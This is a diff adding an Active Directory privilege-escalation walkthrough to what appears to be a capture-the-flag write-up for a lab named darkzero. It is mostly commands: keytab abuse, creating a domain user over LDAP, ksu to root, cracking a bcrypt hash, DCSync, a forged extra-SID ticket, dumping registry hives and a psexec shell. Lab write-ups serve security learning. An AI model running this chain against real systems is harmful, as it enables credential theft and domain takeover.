@@ -366,7 +366,321 @@ ssh -i /tmp/.runner_key -o StrictHostKeyChecking=no svc-runner@172.16.20.3 'id; 
 </div>
 <!-- PAGE BREAK -->
 
-## 7. Remediation Recommendations
+## Privesc (svc-runner → root SRV01 → DC01 root)
+
+**4.1 — interactive session as svc-runner**
+
+bash
+
+```bash
+ssh -i /tmp/.runner_key -o StrictHostKeyChecking=no svc-runner@172.16.20.3
+```
+
+**4.3 — recover domain credential**
+
+bash
+
+```bash
+systemctl cat gitea-runner
+ls -la /tmp/krb5cc_gitea /etc/gitea-runner/
+export KRB5CCNAME=/tmp/krb5cc_gitea
+kinit -kt /etc/gitea-runner/svc-runner.keytab svc-runner
+klist
+```
+
+**4.4 — LDAP bind**
+
+bash
+
+```bash
+ldapsearch -x -H ldap://172.16.20.2 -s base -b '' dnsHostName defaultNamingContext 2>&1 | grep -iE 'dnsHostName|defaultNamingContext'
+echo "SASL_NOCANON on" > ~/.ldaprc
+ldapwhoami -Y GSSAPI -H ldap://DC02.darkzero.ext
+```
+
+**4.5 — find writable OU + confirm create rights**
+
+bash
+
+```bash
+ldapsearch -Y GSSAPI -H ldap://DC02.darkzero.ext -b "DC=darkzero,DC=ext" \
+  "(objectClass=organizationalUnit)" dn 2>/dev/null | grep -E '^dn:'
+
+cat > /tmp/test.ldif << 'EOF'
+dn: CN=testobj,OU=GiteaMigration,DC=darkzero,DC=ext
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+sAMAccountName: testobj
+userAccountControl: 514
+EOF
+ldapadd -Y GSSAPI -H ldap://DC02.darkzero.ext -f /tmp/test.ldif
+```
+
+**4.6 — create domain user `root`**
+
+bash
+
+```bash
+ldapdelete -Y GSSAPI -H ldap://DC02.darkzero.ext "CN=testobj,OU=GiteaMigration,DC=darkzero,DC=ext"
+
+cat > /tmp/root.ldif << 'EOF'
+dn: CN=root,OU=GiteaMigration,DC=darkzero,DC=ext
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: root
+sAMAccountName: root
+userPrincipalName: root@darkzero.ext
+userAccountControl: 514
+EOF
+ldapadd -Y GSSAPI -H ldap://DC02.darkzero.ext -f /tmp/root.ldif
+
+python3 -c "import base64; print(base64.b64encode('\"P@ssw0rd123\"'.encode('utf-16-le')).decode())"
+
+cat > /tmp/setpw.ldif << 'EOF'
+dn: CN=root,OU=GiteaMigration,DC=darkzero,DC=ext
+changetype: modify
+replace: unicodePwd
+unicodePwd:: IgBQAEAAcwBzAHcAMAByAGQAMQAyADMAIgA=
+-
+replace: userAccountControl
+userAccountControl: 512
+EOF
+ldapmodify -Y GSSAPI -H ldap://DC02.darkzero.ext -f /tmp/setpw.ldif
+
+KRB5CCNAME=/tmp/krb5cc_rootuser kinit root@DARKZERO.EXT
+KRB5CCNAME=/tmp/krb5cc_rootuser klist
+```
+
+> Note: the `-` line between the two replace blocks in setpw.ldif is required LDIF syntax — do not remove it.
+
+**4.7 — ksu to local root**
+
+bash
+
+```bash
+which ksu; ls -la /root/.k5login /home/*/.k5login 2>&1 | head
+KRB5CCNAME=/tmp/krb5cc_rootuser ksu root
+```
+
+Prompt becomes `#`. You are root on SRV01.
+
+**4.8 — read backup**
+
+bash
+
+```bash
+id
+ls -la /root/
+grep -iA5 'INSERT INTO `users`' /root/darkzero_campaigns_backup.sql | head -20
+```
+
+⚠ copy celia's bcrypt hash (row id 2).
+
+**4.9 — crack celia (Kali) + confirm privs (SRV01 root)**
+
+bash
+
+```bash
+# Kali:
+echo 'celia:<CELIA_HASH>' > celia.hash
+john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt celia.hash
+```
+
+bash
+
+```bash
+# SRV01 root:
+KRB5CCNAME=/tmp/krb5cc_gitea LDAPSASL_NOCANON=on ldapsearch -Y GSSAPI -H ldap://DC02.darkzero.ext \
+  -b "DC=darkzero,DC=ext" "(sAMAccountName=celia)" memberOf 2>&1 | grep -i memberOf
+
+KRB5CCNAME=/tmp/krb5cc_gitea LDAPSASL_NOCANON=on ldapsearch -Y GSSAPI -H ldap://DC02.darkzero.ext \
+  -b "CN=System,DC=darkzero,DC=ext" "(objectClass=trustedDomain)" \
+  trustPartner trustDirection trustAttributes 2>&1 | grep -iE 'trustPartner|trustDirection|trustAttributes'
+```
+
+**4.10 — tunnel (Kali T2, leave running) + DCSync krbtgt (Kali T1)**
+
+bash
+
+```bash
+# Kali T2 — leave open:
+sshuttle -r josh@TARGET_IP 172.16.20.0/24
+```
+
+bash
+
+```bash
+# Kali T1 — ⚠ celia's password:
+impacket-secretsdump 'darkzero.ext/celia:<CELIA_PW>@172.16.20.2' -just-dc-user krbtgt
+```
+
+⚠ save the krbtgt **aes256** key. Get the source domain SID:
+
+bash
+
+```bash
+# SRV01 root:
+KRB5CCNAME=/tmp/krb5cc_gitea LDAPSASL_NOCANON=on ldapsearch -Y GSSAPI -H ldap://DC02.darkzero.ext \
+  -b "DC=darkzero,DC=ext" "(sAMAccountName=celia)" objectSid 2>/dev/null | grep -i objectsid
+```
+
+Decode base64 → SID; drop the trailing `-NNNN` for the domain SID.
+
+**4.11 — find crossing SID (SRV01 root)**
+
+bash
+
+```bash
+nslookup -type=SRV _ldap._tcp.dc._msdcs.darkzero.htb 172.16.20.2
+getent hosts dc01.darkzero.htb
+
+KRB5CCNAME=/tmp/krb5cc_celia kinit celia@DARKZERO.EXT
+
+KRB5CCNAME=/tmp/krb5cc_celia LDAPSASL_NOCANON=on ldapsearch -Y GSSAPI \
+  -H ldap://dc01.darkzero.htb -b "DC=darkzero,DC=htb" \
+  "(cn=Backup Operators)" member 2>/dev/null | grep -i member
+
+KRB5CCNAME=/tmp/krb5cc_celia LDAPSASL_NOCANON=on ldapsearch -Y GSSAPI \
+  -H ldap://dc01.darkzero.htb -b "DC=darkzero,DC=htb" \
+  "(cn=InfrastructureAdministrators)" objectSid 2>/dev/null | grep -i objectsid
+```
+
+Decode → SID ending `-1603`. ⚠ save it.
+
+**4.12 — forge ticket (Kali T1)** — ⚠ your aes key, source SID, crossing SID:
+
+bash
+
+```bash
+impacket-ticketer -aesKey <KRBTGT_AES256> \
+  -domain darkzero.ext \
+  -domain-sid <SOURCE_DOMAIN_SID> \
+  -extra-sid <TARGET_SID>-1603 \
+  administrator
+
+export KRB5CCNAME=$(pwd)/administrator.ccache
+```
+
+**4.13 — plumbing (Kali T1).** hosts + krb5.conf:
+
+bash
+
+```bash
+echo "172.16.20.2 DC02.darkzero.ext darkzero.ext DARKZERO.EXT" | sudo tee -a /etc/hosts
+echo "172.16.20.1 DC01.darkzero.htb dc01 DARKZERO.HTB darkzero.htb" | sudo tee -a /etc/hosts
+
+sudo tee /etc/krb5.conf > /dev/null << 'EOF'
+[libdefaults]
+    default_realm = DARKZERO.EXT
+    dns_lookup_realm = false
+    dns_lookup_kdc = false
+    rdns = false
+[realms]
+    DARKZERO.EXT = { kdc = 172.16.20.2 ; admin_server = 172.16.20.2 }
+    DARKZERO.HTB = { kdc = 172.16.20.1 ; admin_server = 172.16.20.1 }
+[domain_realm]
+    .darkzero.ext = DARKZERO.EXT
+    darkzero.ext = DARKZERO.EXT
+    .darkzero.htb = DARKZERO.HTB
+    darkzero.htb = DARKZERO.HTB
+EOF
+```
+
+**Clock — the critical fix. Set Kali to the DC's UTC time (note `-u`, or you'll get an EDT/UTC mismatch and endless TKT_NYV/SKEW):**
+
+bash
+
+```bash
+# read DC time:
+# (SRV01 root):  date -u
+sudo timedatectl set-ntp false
+sudo date -u -s '<DC_UTC_TIME e.g. 2026-08-05 21:19:00>'
+date -u   # confirm it matches the DC, not 4-5h off
+```
+
+After this, run impacket raw — no faketime needed. If a later command throws `KRB_AP_ERR_SKEW`, re-run `sudo date -u -s '<current DC time>'`.
+
+**4.14 — confirm SID crossed (Kali T1)**
+
+bash
+
+```bash
+impacket-smbclient -k -no-pass DC01.darkzero.htb
+```
+
+At prompt:
+
+```
+shares
+exit
+```
+
+Expect `C$ ADMIN$ NETLOGON` listed.
+
+**4.15 — export hives server-side, then fetch (Kali T1)**
+
+bash
+
+```bash
+impacket-reg -k -no-pass DC01.darkzero.htb backup -o 'C:\Windows\SYSVOL\sysvol\darkzero.htb\scripts'
+```
+
+Wait for `Saved HKLM\SYSTEM` + `Saved HKLM\SECURITY`. Then:
+
+bash
+
+```bash
+impacket-smbclient -k -no-pass DC01.darkzero.htb
+```
+
+At prompt (order matters — export must be done first):
+
+```
+use NETLOGON
+ls
+get SYSTEM.save
+get SECURITY.save
+exit
+```
+
+Extract machine hash:
+
+bash
+
+```bash
+impacket-secretsdump -system SYSTEM.save -security SECURITY.save LOCAL
+```
+
+⚠ save the `$MACHINE.ACC` NT hash.
+
+**4.16 — DCSync htb + root (Kali T1)** — ⚠ your machine hash, then admin hash:
+
+bash
+
+```bash
+impacket-secretsdump 'darkzero.htb/DC01$@172.16.20.1' \
+  -hashes 'aad3b435b51404eeaad3b435b51404ee:<DC01_MACHINE_NT>' \
+  -just-dc-user Administrator
+```
+
+⚠ save Administrator NT hash. Then:
+
+bash
+
+```bash
+impacket-psexec 'darkzero.htb/Administrator@172.16.20.1' \
+  -hashes 'aad3b435b51404eeaad3b435b51404ee:<ADMIN_NT>'
+```
+
+At the SYSTEM prompt:
+
+```
+type C:\Users\Administrator\Desktop\root.txt
+```
 <div align="center">
 <br>
 <br>
